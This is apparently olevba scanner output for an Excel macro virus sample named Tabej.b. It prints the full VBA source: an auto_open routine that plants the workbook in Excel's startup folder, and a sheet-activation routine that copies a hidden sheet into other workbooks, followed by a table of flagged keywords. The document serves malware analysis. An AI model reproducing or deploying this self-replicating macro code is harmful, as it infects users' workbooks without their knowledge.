olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tabej.b-88d12604c6955930a0db9165d2bd9518d260f956
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO tabej.bas 
in file: Virus.MSExcel.Tabej.b-88d12604c6955930a0db9165d2bd9518d260f956 - OLE stream: '_VBA_PROJECT_CUR/VBA/tabej'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = ""
If Windows(1).Caption = "tabej.xls" Then Workbooks.Add
s$ = Application.StartupPath & "\" & "tabej.xls"
d$ = Dir(s$)
If Not d$ = "tabej.xls" Then rx
Application.OnSheetActivate = "inf"
End Sub
Sub rx()
Attribute rx.VB_ProcData.VB_Invoke_Func = " \n14"
Application.ScreenUpdating = False
cd$ = CurDir()
ChDir Application.StartupPath
ActiveWorkbook.SaveAs filename:=Application.StartupPath & "/" & "tabej.xls"
ActiveWindow.Visible = False
ChDir cd$
Application.ScreenUpdating = True
End Sub
Sub inf()
Attribute inf.VB_ProcData.VB_Invoke_Func = " \n14"
dt = CSng(Date)
For x = 1 To ActiveWorkbook.Sheets.Count
If ActiveWorkbook.Sheets(x).Name = "tabej" Then
If ActiveWorkbook.Name <> ThisWorkbook.Name Then
If dt > 36016 Then
Application.DisplayAlerts = False
ActiveWorkbook.Sheets("tabej").Delete
Exit Sub
Application.DisplayAlerts = True
End If
End If
Exit Sub
End If
Next
Application.ScreenUpdating = False
ThisWorkbook.Sheets("tabej").Copy before:=ActiveWorkbook.Sheets(1)
ActiveWorkbook.Sheets("tabej").Visible = False
Application.ScreenUpdating = True
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  tabe
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

